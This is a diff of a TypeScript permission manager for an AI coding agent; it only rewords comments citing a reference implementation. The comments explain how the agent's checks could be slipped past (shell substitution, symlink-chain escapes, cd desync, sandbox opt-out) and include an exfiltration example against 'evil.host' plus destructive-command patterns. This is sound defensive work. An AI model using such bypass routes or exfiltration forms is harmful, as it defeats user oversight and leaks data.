+     * /etc/hosts") instead of only the whole tool call. Mirrors the reference's
      * `PermissionAskDecision.blockedPath` / `PermissionResult.blockedPath`
      * (types/permissions.ts L196-266). Omitted when no single path is at fault
      * (e.g. a mode-wide prompt, a bash-rule deny) and always omitted on `allow`.
@@ -7018,7 +7018,7 @@ export class PermissionManager {
    * The specific filesystem path a non-allow verdict is about, or `undefined`
    * when the verdict is not path-specific. Prefers the structured `workingDir`
    * reason's offending path; otherwise falls back to a file tool's own
-   * `file_path`/`path` input. Pure read — never mutates. Parity with Claude's
+   * `file_path`/`path` input. Pure read — never mutates. Parity with the reference's
    * `blockedPath`, surfaced so a prompt/denial can name the exact path.
    */
   private deriveBlockedPath(
@@ -7040,7 +7040,7 @@ export class PermissionManager {
    *  1. a standing `allow` RULE matched → `{ type:'rule', action:'allow', ruleValue }`
    *     (reuses {@link matchedAllowRule}, the single rule-provenance source);
    *  2. otherwise the active permission MODE granted it (bypassPermissions / auto-allow /
-   *     acceptEdits / plan read-only) → `{ type:'mode', mode }` — parity with Claude's
+   *     acceptEdits / plan read-only) → `{ type:'mode', mode }` — parity with the reference's
    *     auto-allow `decisionReason: { type:'mode', mode:'acceptEdits' }` (PowerShellTool
    *     modeValidation.ts L396-403). (The default `ask` mode never auto-allows a rule-less
    *     call, so there is no third, classifier-only arm to attribute.)
@@ -7057,7 +7057,7 @@ export class PermissionManager {
    * Evaluate EACH segment of a compound bash command independently through
    * {@link check}, returning a `{ segment: verdict }` map — the data a UI/executor
    * needs to attribute a compound command's ask/deny to the exact offending
-   * segment (parity: Claude's per-segment `subcommandResults`, deny-wins
+   * segment (parity: the reference's per-segment `subcommandResults`, deny-wins
    * aggregation). Returns `undefined` for a non-bash tool, a non-string command,
    * or a single (non-compound) command — cases with nothing to disambiguate.
    * Segments are de-duplicated (a repeated segment is evaluated once).
@@ -7101,7 +7101,7 @@ export class PermissionManager {
     // Sandbox opt-out: a bash call that set `dangerouslyDisableSandbox` is gated
     // because it wants to run UNSANDBOXED, not because of the mode — attribute the
     // ask to `sandboxOverride` so the prompt explains it needs to bypass the sandbox
-    // (parity with Claude's sandboxOverride decisionReason). Only on an `ask`; a
+    // (parity with the reference's sandboxOverride decisionReason). Only on an `ask`; a
     // deny-all deny stays attributed to the mode below.
     if (decision === 'ask' && toolName === 'bash' && input.dangerouslyDisableSandbox === true) {
       return { type: 'sandboxOverride' };
@@ -7139,7 +7139,7 @@ export class PermissionManager {
         return { type: 'safetyCheck', check: 'systemDir', message: 'Command writes to a system directory and requires approval' };
       }
       if (this.classifyBashCommand(command) === 'destructive') {
-        // Surface the SPECIFIC human-readable warning (parity with Claude's
+        // Surface the SPECIFIC human-readable warning (parity with the reference's
         // getDestructiveCommandWarning) when the command matches a known signature,
         // so the prompt says WHY it is destructive; else a generic line.
         const warning = getDestructiveCommandWarning(command);
@@ -7188,7 +7188,7 @@ export class PermissionManager {
       if (hasSuspiciousPathPattern(filePath)) return { type: 'safetyCheck', check: 'suspiciousPath', message: 'Path uses a canonicalization-bypass pattern and requires approval' };
       // Out-of-workspace target: the path is outside the launch cwd and every
       // user-granted read root, so it needs explicit consent regardless of the
-      // mode — attribute the ask to `workingDir` (parity with Claude's workingDir
+      // mode — attribute the ask to `workingDir` (parity with the reference's workingDir
       // decisionReason) so the prompt can explain WHERE the boundary is and offer
       // /add-dir, instead of a generic "mode requires approval".
       if (decision === 'ask' && this.classifyReadAccess(filePath, process.cwd()) === 'prompt') {
@@ -7268,7 +7268,7 @@ export class PermissionManager {
     // / an inline group) the flat classifier cannot soundly reason about — a
     // benign-looking inner command can still carry a redirection, cd-desync, or
     // side effect at the group boundary that per-command classification misses.
-    // Claude Code forces behavior:'ask' with NO rule suggestions in exactly this
+    // the reference forces behavior:'ask' with NO rule suggestions in exactly this
     // case (bashToolCheckCommandOperatorPermissions via
     // getTreeSitterAnalysis().compoundStructure.hasSubshell || hasCommandGroup),
     // because such a grouping can never be safely auto-allowed. AMI mirrors that
@@ -7293,7 +7293,7 @@ export class PermissionManager {
     // that could hide a dangerous command (e.g. `echo "ls` auto-allowed as a bare
     // `echo`). Classify it `'unsafe'` so it prompts rather than being proven safe.
     // Heredoc bodies are stripped first so a legitimate `'`/`"` inside a heredoc body
-    // (not shell syntax) never trips the balance check. Mirrors Claude Code's
+    // (not shell syntax) never trips the balance check. Mirrors the reference's
     // tryParseShellCommand → require-permission-on-parse-failure gate.
     if (hasUnbalancedQuotes(stripHeredocBodies(trimmed))) return 'unsafe';
 
@@ -7316,7 +7316,7 @@ export class PermissionManager {
       // `git clean` is flag-dependent: a `-n`/`--dry-run` preview only LISTS what
       // would be removed (read-only) and must NOT be escalated; only an actual
       // clean (`-f`/`--force`) deletes untracked files. Shares GIT_CLEAN_FORCE_RE
-      // with the warning engine so both paths agree (parity: Claude excludes the
+      // with the warning engine so both paths agree (parity: the reference excludes the
       // dry-run from the destructive boundary).
       if (cmd === 'git clean') {
         if (GIT_CLEAN_FORCE_RE.test(trimmed)) return 'destructive';
@@ -7350,7 +7350,7 @@ export class PermissionManager {
     if (/\bgit\s+reset\s+--keep\b/.test(trimmed)) return 'destructive';
     // A force push can overwrite remote history on ANY branch (not only protected
     // ones), so it is a distinct destructive boundary above a normal `git push`
-    // (Claude escalates --force/--force-with-lease/-f). A bare `git push` stays
+    // (the reference escalates --force/--force-with-lease/-f). A bare `git push` stays
     // merely 'unsafe' below via UNSAFE_COMMANDS.
     if (/\bgit\s+push\b[^\n]*?(?:--force\b|--force-with-lease\b|\s-[A-Za-z]*f\b)/.test(trimmed)) return 'destructive';
     // `git branch -D` / `--delete --force` force-deletes a branch even when it is
@@ -7369,17 +7369,17 @@ export class PermissionManager {
     // `info --subnodes | …`. These must never be auto-approved even when man/help
     // sit in SAFE_COMMANDS or an allow rule — man and help are classified by their
     // literal command name, and `help` is often aliased to `man`. Wires the
-    // bash-security detector into the classifier (Claude's man/help safeFlags).
+    // bash-security detector into the classifier (the reference's man/help safeFlags).
     if (detectUnsafeHelpCommand(trimmed)) return 'unsafe';
 
     // A `cd`/`Set-Location` followed by a file-writing redirection resolves the
     // target against the NEW cwd at runtime — a path-desync the validator can't see.
-    // Require manual approval (Claude's cd+write guard).
+    // Require manual approval (the reference's cd+write guard).
     if (commandHasCdWriteDesync(trimmed)) return 'unsafe';
 
     // More than one directory change in a single command defeats cwd-relative path
     // validation (the validator can't track which cwd each later statement runs in).
-    // Require approval (Claude's multi-cd guard).
+    // Require approval (the reference's multi-cd guard).
     if (countDirectoryChanges(trimmed) > 1) return 'unsafe';
 
     // xargs anywhere in the command (even behind a pipe like `ls | xargs …`) must
@@ -7413,12 +7413,12 @@ export class PermissionManager {
     // Docker: only read-only subcommands are safe. Reject ANY `$`-substitution
     // first — the validator sees the literal `$VAR`/`$(cmd)` text but the shell
     // expands it at runtime, a parser differential that can smuggle a non-read
-    // subcommand or secret past this check (Claude's isDockerSafe `$` rejection).
+    // subcommand or secret past this check (the reference's isDockerSafe `$` rejection).
     if (/\bdocker\s+/.test(trimmed)) {
       if (containsShellSubstitution(unwrapped)) return 'unsafe';
       // Skip leading global flags (and the values they consume, e.g. `-H <host>`,
       // `--context <ctx>`) to reach the REAL subcommand, so `docker -D ps` reads
-      // `ps` instead of `-D`. Mirrors Claude's spec-driven flag-value skipping.
+      // `ps` instead of `-D`. Mirrors the reference's spec-driven flag-value skipping.
       const dockerTokens = trimmed.split(/\s+/).filter(Boolean);
       const dIdx = dockerTokens.indexOf('docker');
       const subIdx = dIdx >= 0 ? skipGlobalFlags(dockerTokens, dIdx + 1, BASH_COMMAND_SPECS['docker']) : -1;
@@ -7444,13 +7444,13 @@ export class PermissionManager {
         // A `gh` read-only prefix can still exfiltrate via a foreign HOST/OWNER/REPO
         // spec (`gh pr list --repo evil.host/owner/repo`) or smuggle a write in a
         // compound. Revalidate the full command before auto-allowing (gh analogue of
-        // the git guard above). Mirrors Claude's ghIsDangerousCallback.
+        // the git guard above). Mirrors the reference's ghIsDangerousCallback.
         if (cmd.startsWith('gh ') && !isGhReadOnlyCommandSafe(unwrapped)) return 'unsafe';
         // Reject `$`-substitution in ANY auto-allowed compound/external read
         // command (git, gh, npm, go, cargo, make, …) — the validator sees the
         // literal `$VAR`/`$(cmd)` text but the shell expands it at runtime, a
         // parser differential that can smuggle a non-read subcommand or leak a
-        // secret via an error message past this check. Mirrors Claude's blanket
+        // secret via an error message past this check. Mirrors the reference's blanket
         // `$`-rejection on auto-allowed external commands (isGitSafe/isDockerSafe
         // and the PowerShell readOnlyValidation variable-expansion guard).
         if (containsShellSubstitution(unwrapped)) return 'unsafe';
@@ -7470,7 +7470,7 @@ export class PermissionManager {
 
         // `date`: a bare positional like `010203042024` SETS the system clock.
         // Only a format string (leading '+') is read-only — any other positional
-        // (or -s/--set/-f) must prompt. Mirrors Claude's date dangerous-callback.
+        // (or -s/--set/-f) must prompt. Mirrors the reference's date dangerous-callback.
         if (cmd === 'date') {
           for (const a of args) {
             if (a.startsWith('-')) {
@@ -7486,7 +7486,7 @@ export class PermissionManager {
         if ((cmd === 'jq' || cmd === 'yq') && isJqDangerous(args)) return 'unsafe';
 
         // `hostname`: a bare positional SETS the system hostname (`hostname newname`).
-        // Only flag-driven reads (`hostname -f`, `-i`, …) are safe. Mirrors Claude's
+        // Only flag-driven reads (`hostname -f`, `-i`, …) are safe. Mirrors the reference's
         // hostname positional-argument guard.
         if (cmd === 'hostname') {
           for (const a of args) {
@@ -7497,7 +7497,7 @@ export class PermissionManager {
         // `tput`: capability names are positionals. Only read-only capabilities are
         // safe; the dangerous ones (reset/init/clear/mc5/pfloc/… and the `-S` stdin
         // batch flag) alter terminal state or run arbitrary sequences. Strict: any
-        // capability not on the allowlist prompts. Mirrors Claude's tput guard.
+        // capability not on the allowlist prompts. Mirrors the reference's tput guard.
         if (cmd === 'tput') {
           const allowedCaps = SAFE_COMMAND_FLAGS['tput']!.allowed;
           for (const a of args) {
@@ -7508,7 +7508,7 @@ export class PermissionManager {
         }
 
         // `lsof`: `+` options write/augment state — notably `+m`/`+m<path>` emits a
-        // mount-supplement file. Only `-` read flags are safe. Mirrors Claude's lsof
+        // mount-supplement file. Only `-` read flags are safe. Mirrors the reference's lsof
         // `+`-option rejection.
         if (cmd === 'lsof') {
           for (const a of args) {
@@ -7521,7 +7521,7 @@ export class PermissionManager {
 
         // `dotnet`: only its read-only top-level SDK queries (--version/--info/
         // --list-runtimes/--list-sdks) are auto-safe. A bare `dotnet` (help) or any
-        // subcommand (build/run/test/…) must prompt. Mirrors Claude's isDotnetSafe.
+        // subcommand (build/run/test/…) must prompt. Mirrors the reference's isDotnetSafe.
         if (cmd === 'dotnet' && !isDotnetSafe(args)) return 'unsafe';
 
         // Block shell substitutions ($VAR, $(cmd)) but allow glob patterns
@@ -7535,7 +7535,7 @@ export class PermissionManager {
     // sed without an in-place write flag is read-only (prints to stdout). Uses a
     // per-segment, quote-aware tokenized check so a `-...i` flag belonging to a
     // different command in a compound, or a quoted `-i` inside the sed script, no
-    // longer forces a misclassification (parity: Claude's tokenized isReadOnlySed).
+    // longer forces a misclassification (parity: the reference's tokenized isReadOnlySed).
     if (isReadOnlySedCommand(trimmed)) return 'safe';
     // find is read-only only without any command-running primary
     // (-delete, -exec, -execdir, -ok, -okdir).
@@ -7555,7 +7555,7 @@ export class PermissionManager {
     // PowerShell read-only cmdlets (Get-ChildItem, Get-Content, Select-String, …)
     // are the Windows equivalents of the POSIX SAFE_COMMANDS reads above. A
     // command composed solely of allowlisted read-only cmdlets with no dangerous
-    // construct is auto-allowed, mirroring Claude's CMDLET_ALLOWLIST /
+    // construct is auto-allowed, mirroring the reference's CMDLET_ALLOWLIST /
     // isReadOnlyCommand. Placed last so every destructive/unsafe guard above
     // (incl. the system-directory and credential-path nets) wins first.
     if (isReadOnlyPowerShellCommand(trimmed)) return 'safe';
@@ -7592,7 +7592,7 @@ export class PermissionManager {
     // FIFO waiting for a writer (an unbounded hang with no timeout), so a special
     // file is never realpath-resolved — its expanded (NFC) form is returned as-is.
     // A non-existent path (ENOENT) or unreadable parent falls through to realpathNFC,
-    // which tolerates it (write targets keep their expanded form). Mirrors Claude's
+    // which tolerates it (write targets keep their expanded form). Mirrors the reference's
     // safeResolvePath special-file screen (utils/fsOperations.ts L148-161).
     try {
       const st = fs.lstatSync(expanded);
@@ -7646,7 +7646,7 @@ export class PermissionManager {
    * closes the symlink-chain escape where only the final realpath is inspected —
    * e.g. `top → dir/id_rsa → dir/plain.txt`: the final `plain.txt` is innocuous but
    * the intermediate `id_rsa` hop is a credential path the deny must still catch.
-   * Mirrors Claude's getPathsForPermissionCheck "match at any hop" semantics.
+   * Mirrors the reference's getPathsForPermissionCheck "match at any hop" semantics.
    */
   private isForbiddenAtAnyHop(filePath: string, cwd: string, precomputedHops?: readonly string[]): boolean {
     const expanded = expandPath(filePath, cwd);
@@ -7660,7 +7660,7 @@ export class PermissionManager {
    * The canonical hop list for an input path when it needs NO symlink resolution —
    * i.e. the NFC realpath (`resolved`) is byte-equal to the plain NFC-expanded form.
    * In that case the symlink-hop walk is trivially `[resolved]`, so returning it
-   * lets {@link isForbiddenAtAnyHop} skip the lstat/readlink chain (parity: Claude's
+   * lets {@link isForbiddenAtAnyHop} skip the lstat/readlink chain (parity: the reference's
    * precomputedPathsToCheck canonical fast-path). Returns `undefined` when the path
    * DID resolve through a symlink / `..` collapse, so the caller falls back to the
    * full hop walk that still inspects every intermediate target.
@@ -7689,7 +7689,7 @@ export class PermissionManager {
     // macOS /private symlink-equivalence: /private/var→/var, /private/tmp→/tmp.
     // Lexical (not realpath) so it also folds a NON-EXISTENT write target, whose
     // real path cannot be resolved. Applied to both sides before case/NFC folding.
-    // Mirrors Claude's pathInWorkingPath private-prefix normalization. On Linux the
+    // Mirrors the reference's pathInWorkingPath private-prefix normalization. On Linux the
     // prefixes never occur, so this is a no-op.
     const foldPrivate = (p: string) =>
       p.replace(/^\/private\/var\//, '/var/').replace(/^\/private\/tmp(\/|$)/, '/tmp$1');
@@ -7701,13 +7701,13 @@ export class PermissionManager {
     // and its REALPATH-resolved form, so a launch cwd / root that is itself a
     // symlink (e.g. process.env.PWD symlinked to the real cwd) still contains the
     // realpath-canonicalized candidate `resolved`. realpath is wrapped in try/catch
-    // for a not-yet-existing base. Mirrors Claude's symlinked-PWD working-dir
+    // for a not-yet-existing base. Mirrors the reference's symlinked-PWD working-dir
     // registration (permissionSetup.ts isSymlinkTo). This only ADDS matches — it
     // never widens past the real directory tree, so it cannot cause a false allow.
     for (const base of [path.normalize(cwd), ...this.allowedReadRoots.keys()]) {
       if (contains(strip(base))) return true;
       // Session-stable: a base's canonical realpath is memoized so repeated checks
-      // don't re-pay the lstat/readlink walk per base (parity: Claude's
+      // don't re-pay the lstat/readlink walk per base (parity: the reference's
       // memoize(getPathsForPermissionCheck) for session-stable config paths). A
       // non-existent base resolves to null and is not cached, so the normalized
       // form above stays the only candidate for it.
@@ -7735,7 +7735,7 @@ export class PermissionManager {
     if (this.isForbiddenAtAnyHop(filePath, cwd, this.canonicalHopFastPath(filePath, cwd, resolved))) return false;
     // Scratchpad carve-out: a path inside the operator-configured scratchpad dir is
     // inside the agent's allowed read surface even when it sits outside the launch
-    // workspace (parity: Claude's getScratchpadDir allowlist). Placed AFTER the
+    // workspace (parity: the reference's getScratchpadDir allowlist). Placed AFTER the
     // forbidden guards so a credential/system path can never be laundered through it.
     if (isScratchpadPath(resolved)) return true;
     // A shell-expansion / tilde-variant TOCTOU path is never silently auto-allowed
@@ -7766,16 +7766,16 @@ export class PermissionManager {
     // innocuous final file. A path that needed no symlink resolution skips the walk.
     if (this.isForbiddenAtAnyHop(filePath, cwd, this.canonicalHopFastPath(filePath, cwd, resolved))) return 'deny';
     // Scratchpad carve-out: a read inside the operator-configured scratchpad dir is
-    // auto-allowed even outside the launch workspace (parity: Claude's getScratchpadDir
+    // auto-allowed even outside the launch workspace (parity: the reference's getScratchpadDir
     // allowlist). AFTER the forbidden guards so a credential/system path still denies.
     if (isScratchpadPath(resolved)) return 'allow';
     // TOCTOU: a path carrying shell-expansion syntax ($/%/leading '=') or an
     // unsupported tilde variant (~user/~+/~-) is validated as a literal here but
     // rewritten by the shell at execution, so it can never be silently auto-allowed
     // even when it resolves inside the workspace — force a manual-approval prompt.
-    // Mirrors Claude's pathValidation blanket-reject (pathValidation.ts L393-L436).
+    // Mirrors the reference's pathValidation blanket-reject (pathValidation.ts L393-L436).
     if (detectPathExpansionHazard(filePath)) {
-      // Deny-only guess BEFORE prompting (parity: Claude's checkDenyRuleForGuessedPath,
+      // Deny-only guess BEFORE prompting (parity: the reference's checkDenyRuleForGuessedPath,
       // PowerShellTool/pathValidation.ts L984-L1008): strip the obscuring construct to a
       // best-effort literal and, if THAT resolves to a forbidden credential/system path,
       // DENY outright instead of merely prompting. Without this an obscured forbidden
@@ -7799,7 +7799,7 @@ export class PermissionManager {
     // examined while the literal glob still prefix-matches the workspace. Force a
     // manual-approval prompt for a plain read glob; a traversal glob falls through
     // so its `..`-collapsed concrete target is validated against the workspace and
-    // forbidden guards above. Parity: Claude's pathValidation.ts L1199-L1241.
+    // forbidden guards above. Parity: the reference's pathValidation.ts L1199-L1241.
     if (isUnvalidatableReadGlob(filePath)) return 'prompt';
     if (this.isWithinWorkspace(resolved, cwd)) return 'allow';
     // Edit-access-implies-read: an out-of-workspace path the user granted EDIT access
@@ -7858,7 +7858,7 @@ export class PermissionManager {
    * Record a denial. Always advances the circuit-breaker counters; when a
    * `display` string is supplied it is ALSO appended (newest-first, bounded) to
    * the recency-ordered denial log so the user can later review exactly what was
-   * blocked (mirrors Claude's getAutoModeDenials / AutoModeDenial store). This is
+   * blocked (mirrors the reference's getAutoModeDenials / AutoModeDenial store). This is
    * the single canonical denial recorder — do not add a parallel one. `source`
    * distinguishes a model/classifier block from a rule/hardline/mode deny.
    */
@@ -7933,7 +7933,7 @@ export class PermissionManager {
    * reports how many actions were blocked this session; otherwise it reports the
    * consecutive run. Both end with a prompt to review the transcript. This gives
    * the user an actionable sentence explaining WHY they are suddenly being asked to
-   * review, instead of a bare `shouldAbort` boolean. Mirrors Claude Code's
+   * review, instead of a bare `shouldAbort` boolean. Mirrors the reference's
    * denial-limit warning composition (utils/permissions/permissions.ts
    * L999-L1058): the total-limit message takes precedence over the consecutive one.
    * Pure read of the live counters — does not mutate or reset them.
@@ -7994,7 +7994,7 @@ export class PermissionManager {
    * Register (or clear, with `undefined`) the single listener notified on every
    * real permission-mode transition. Replaces any previously-registered listener —
    * there is exactly one observer, so mode-change auditing has a single wiring point
-   * and cannot be double-counted. Parity: Claude's `permissionModeListener` register.
+   * and cannot be double-counted. Parity: the reference's `permissionModeListener` register.
    */
   setModeChangeListener(listener: PermissionModeChangeListener | undefined): void {
     this._modeChangeListener = listener;
@@ -8005,7 +8005,7 @@ export class PermissionManager {
    * a mode transition, or a read-root grant/revoke — so a consumer can RE-EVALUATE
    * a decision that is already in flight. Returns an unsubscribe function.
    *
-   * This is the core primitive behind Claude Code's `recheckPermission()`: when the
+   * This is the core primitive behind the reference's `recheckPermission()`: when the
    * rules change concurrently with an open permission prompt (the user adds an allow
    * rule elsewhere, a hook applies `updatedPermissions`, a `/permissions` edit lands),
    * the still-open request re-runs {@link check} and can resolve ITSELF — allow or
@@ -8038,7 +8038,7 @@ export class PermissionManager {
    * through here so a change can never bypass the {@link _modeChangeListener}
    * notification. A no-op (`next === current`) neither assigns nor notifies — only a
    * genuine transition fires the listener, so default→bubble→default-style noise is
-   * suppressed, mirroring Claude's `prevMode !== newMode` diff gate. The listener is
+   * suppressed, mirroring the reference's `prevMode !== newMode` diff gate. The listener is
    * invoked defensively: a throwing listener must never leave `mode` unchanged or
    * abort the caller. Returns whether a real transition occurred.
    */
@@ -8046,7 +8046,7 @@ export class PermissionManager {
     const previousMode = this.mode;
     if (previousMode === next) return false;
     this.mode = next;
-    // Transition-time context cleanup (parity: Claude's `transitionPermissionMode`,
+    // Transition-time context cleanup (parity: the reference's `transitionPermissionMode`,
     // getNextPermissionMode.ts L84-100): entering a MORE permissive mode strips any
     // dangerous code-execution `allow` rule so a broad interpreter grant obtained in
     // one mode (e.g. an `acceptEdits` session grant of `Bash(python:*)`) does not
@@ -8062,7 +8062,7 @@ export class PermissionManager {
     // Leaving plan mode must tear down any active auto-mode-during-plan: deactivate the
     // realized state and restore the rules it temporarily stripped, so a subsequent mode
     // keeps its full rule set and the classifier-screening is not silently carried out
-    // of plan. Parity: Claude's transitionPermissionMode plan→non-plan path running
+    // of plan. Parity: the reference's transitionPermissionMode plan→non-plan path running
     // restoreDangerousPermissions + setAutoModeActive(false).
     if (previousMode === 'plan' && next !== 'plan' && this._autoModeActiveDuringPlan) {
       this._autoModeActiveDuringPlan = false;
@@ -8092,7 +8092,7 @@ export class PermissionManager {
 
   /**
    * The permission mode captured when plan mode was entered, or undefined if not
-   * in plan mode / none captured (Claude's ToolPermissionContext.prePlanMode).
+   * in plan mode / none captured (the reference's ToolPermissionContext.prePlanMode).
    */
   getPrePlanMode(): PermissionMode | undefined {
     return this._prePlanMode;
@@ -8100,7 +8100,7 @@ export class PermissionManager {
 
   /**
    * Leave plan mode, restoring the permission mode that was active before plan was
-   * entered (Claude's ExitPlanMode prePlanMode restore). When not currently in
+   * entered (the reference's ExitPlanMode prePlanMode restore). When not currently in
    * plan mode this is a no-op that returns the current mode. The restore is routed
    * through {@link setMode} so managed policy still applies — if the captured mode
    * was a bypass mode now forbidden by a killswitch, it falls back to 'ask'. When
@@ -8124,7 +8124,7 @@ export class PermissionManager {
    * (surfaced via {@link disableBypassReason} and, through
    * {@link autoModeUnavailableReason}, the Shift+Tab/auto-mode notification). It is
    * recorded only when disabling and cleared when re-enabling, so a stale reason
-   * never lingers once the guard is lifted. Mirrors Claude's reason-differentiated
+   * never lingers once the guard is lifted. Mirrors the reference's reason-differentiated
    * auto-mode-unavailable wording (settings vs circuit-breaker vs org-allowlist).
    */
   setDisableBypass(disable: boolean, reason?: string): void {
@@ -8144,7 +8144,7 @@ export class PermissionManager {
    * bypass is permitted (or was disabled without a reason). Lets `/permissions`
    * and the Shift+Tab message explain WHY auto-allow cannot be entered instead of
    * showing a bare `bypassDisabled` boolean the operator cannot act on. Parity:
-   * Claude's `getAutoModeUnavailableNotification(reason)`.
+   * the reference's `getAutoModeUnavailableNotification(reason)`.
    */
   disableBypassReason(): string | undefined {
     return this._disableBypassReason;
@@ -8152,7 +8152,7 @@ export class PermissionManager {
 
   /**
    * Mark whether bypass-permissions mode was available when the session started
-   * (Claude's `isBypassPermissionsModeAvailable`). The CLI sets this from a launch
+   * (the reference's `isBypassPermissionsModeAvailable`). The CLI sets this from a launch
    * flag; when true, a `plan`-mode run inherits bypass semantics in {@link check}.
    */
   setBypassModeAvailable(available: boolean): void {
@@ -8161,7 +8161,7 @@ export class PermissionManager {
 
   /**
    * Whether bypass-permissions mode is available for this session (gates plan-mode
-   * bypass inheritance). Mirrors Claude's ToolPermissionContext field.
+   * bypass inheritance). Mirrors the reference's ToolPermissionContext field.
    */
   isBypassModeAvailable(): boolean {
     return this._bypassModeAvailable;
@@ -8178,7 +8178,7 @@ export class PermissionManager {
    * Whether a rule can be edited/removed by the user. A rule loaded from managed/
    * enterprise policy ({@link isManagedPermissionSource}) is read-only; every other
    * source is user-editable. Lets a rule-management UI disable edit/delete and show
-   * {@link ruleReadOnlyNotice} for locked rules. Parity: Claude's PermissionRuleList
+   * {@link ruleReadOnlyNotice} for locked rules. Parity: the reference's PermissionRuleList
    * policy-rule lockdown.
    */
   isRuleEditable(rule: PermissionRule): boolean {
@@ -8206,7 +8206,7 @@ export class PermissionManager {
     // Reject a bash ALLOW rule whose pattern bakes in a shell-DYNAMIC construct
     // ($(...), backtick, ${...}, $VAR, or a backslash path fragment): such a token
     // makes a persisted allow match MORE/different commands than the user saw, so it
-    // must never become a reusable grant (parity: Claude's staticPrefix sanitization
+    // must never become a reusable grant (parity: the reference's staticPrefix sanitization
     // of dynamic args before emitting a persistent prefix rule). Deny/ask rules are
     // unaffected — a dynamic token there only widens what is BLOCKED/PROMPTED, which
     // is not a privilege-escalation hazard.
@@ -8219,7 +8219,7 @@ export class PermissionManager {
     }
     // Dedup: skip a rule already present under a normalized identity (so a legacy/
     // alias tool name — e.g. `Bash` — is recognized as the same rule as `bash`),
-    // mirroring Claude's normalized-Set dedup in addPermissionRulesToSettings
+    // mirroring the reference's normalized-Set dedup in addPermissionRulesToSettings
     // (permissionsLoader.ts L244-L285). Prevents duplicate grants accumulating
     // across repeated "always allow" clicks or applyPermissionUpdate re-runs.
     const key = this.ruleDedupKey(rule);
@@ -8264,7 +8264,7 @@ export class PermissionManager {
    */
   private toolNameMatches(ruleTool: string, toolName: string): boolean {
     // Canonicalize legacy/cross-framework names (e.g. a `Bash`/`Edit` rule
-    // imported from a Claude settings file matches AMI's `bash`/`file_edit`).
+    // imported from a reference settings file matches AMI's `bash`/`file_edit`).
     const rt = normalizeToolName(ruleTool);
     if (rt === '*' || rt === toolName) return true;
     if (rt.includes('*') && matchPattern(rt, toolName)) return true;
@@ -8272,7 +8272,7 @@ export class PermissionManager {
     // EVERY tool from that server (`mcp__server__tool1`, `mcp__server__tool2`, …),
     // exactly like the explicit `mcp__server__*` form (already handled by the glob
     // branch above). A bare `mcp__server` carries no wildcard, so without this it
-    // would match nothing. Mirrors Claude's toolMatchesRule MCP special-case
+    // would match nothing. Mirrors the reference's toolMatchesRule MCP special-case
     // (utils/permissions/permissions.ts): rule-info toolName undefined/`*` + same
     // server ⇒ match.
     const ruleInfo = mcpInfoFromString(rt);
@@ -8338,7 +8338,7 @@ export class PermissionManager {
    * code-execution prefix and that check() therefore downgrades to a prompt in
    * `ask` / `acceptEdits` modes. Lets a UI / diagnostic surface explain which
    * user rules are being treated as code-execution escape hatches rather than
-   * silent auto-approvals. Mirrors Claude's `findDangerousClassifierPermissions`.
+   * silent auto-approvals. Mirrors the reference's `findDangerousClassifierPermissions`.
    */
   getDangerousCodeExecAllowRules(): PermissionRule[] {
     return this.rules.filter(r => this.isDangerousCodeExecAllow(r));
@@ -8354,7 +8354,7 @@ export class PermissionManager {
    * downgrade only moves such a rule to a prompt, whereas a hostile project rule
    * should not exist at all. Personal tiers (user/local/cliArg/session) and an
    * untagged rule are the user's own and are left intact. Returns the newly
-   * stripped rules. Parity: Claude's dangerous-rule stripping into
+   * stripped rules. Parity: the reference's dangerous-rule stripping into
    * `ToolPermissionContext.strippedDangerousRules`.
    */
   private stripDangerousRulesFromUntrustedSources(): PermissionRule[] {
@@ -8384,7 +8384,7 @@ export class PermissionManager {
    * untrusted tiers only), this fires at runtime on the actual escalation and also
    * covers an in-session grant. Stripped rules are recorded in
    * {@link strippedDangerousRules} for introspection and each is traced. Returns the
-   * rules removed. Parity: Claude's `transitionPermissionMode` dangerous-permission
+   * rules removed. Parity: the reference's `transitionPermissionMode` dangerous-permission
    * cleanup (getNextPermissionMode.ts L84-100).
    */
   private stripDangerousRulesOnEscalation(enteringMode: PermissionMode): PermissionRule[] {
@@ -8422,7 +8422,7 @@ export class PermissionManager {
    * {@link strippedDangerousRules}), this is a REVERSIBLE strip: while auto mode runs
    * the classifier must not be bypassed by a prefix-rule allow, but leaving auto mode
    * puts the user's rules back. Idempotent-safe — a re-strip (settings re-sync while
-   * already active) just captures any newly re-added disk rules. Parity: Claude's
+   * already active) just captures any newly re-added disk rules. Parity: the reference's
    * stripDangerousPermissionsForAutoMode (permissionSetup.ts).
    */
   private stripDangerousRulesForAutoMode(): PermissionRule[] {
@@ -8449,7 +8449,7 @@ export class PermissionManager {
    * Restore the rules previously stripped by {@link stripDangerousRulesForAutoMode}
    * (auto-mode deactivation, or leaving plan mode). Re-appends the stash and clears
    * it. A no-op (preserving ref-equality of {@link rules}) when nothing is stashed.
-   * Parity: Claude's restoreDangerousPermissions (permissionSetup.ts) replaying
+   * Parity: the reference's restoreDangerousPermissions (permissionSetup.ts) replaying
    * strippedDangerousRules back as `addRules`.
    */
   private restoreAutoModeStrippedRules(): PermissionRule[] {
@@ -8474,12 +8474,12 @@ export class PermissionManager {
    * rules — so toggling `useAutoModeDuringPlan` mid-plan takes effect immediately.
    *
    * No-op when NOT in plan mode (auto-during-plan only applies while planning), and —
-   * mirroring Claude's entry-time exclusion — never activates when plan mode was
+   * mirroring the reference's entry-time exclusion — never activates when plan mode was
    * entered from `bypassPermissions` (a dangerous mode must not silently gain the
    * classifier). When the desire is unchanged and auto is already active, it RE-STRIPS,
    * because {@link syncRulesFromDisk} re-adds disk rules (including a trusted-tier
    * `Bash(python:*)`) that must not reopen a classifier bypass. Returns a structured
-   * summary of what changed for introspection. Parity: Claude's transitionPlanAutoMode
+   * summary of what changed for introspection. Parity: the reference's transitionPlanAutoMode
    * (permissionSetup.ts), called from applySettingsChange (applySettingsChange.ts:L68).
    */
   transitionPlanAutoMode(): { activated?: boolean; deactivated?: boolean; restripped?: boolean } {
@@ -8509,7 +8509,7 @@ export class PermissionManager {
    * Introspection: whether auto-mode screening is currently ACTIVE during plan mode
    * ({@link _autoModeActiveDuringPlan}). Lets a diagnostic / `/permissions` surface
    * report that plan-mode tool calls are being screened by the classifier rather than
-   * held to the pure read-only allowlist. Parity: Claude's
+   * held to the pure read-only allowlist. Parity: the reference's
    * autoModeState.isAutoModeActive().
    */
   isAutoModeActiveDuringPlan(): boolean {
@@ -8530,7 +8530,7 @@ export class PermissionManager {
    * Introspection: active `allow` rules that auto-approve EVERY bash command (a
    * pattern-less / `*` bash allow, or an all-tools `*` allow — the YOLO
    * equivalent). Lets a diagnostic / `/doctor` surface report WHICH rules silently
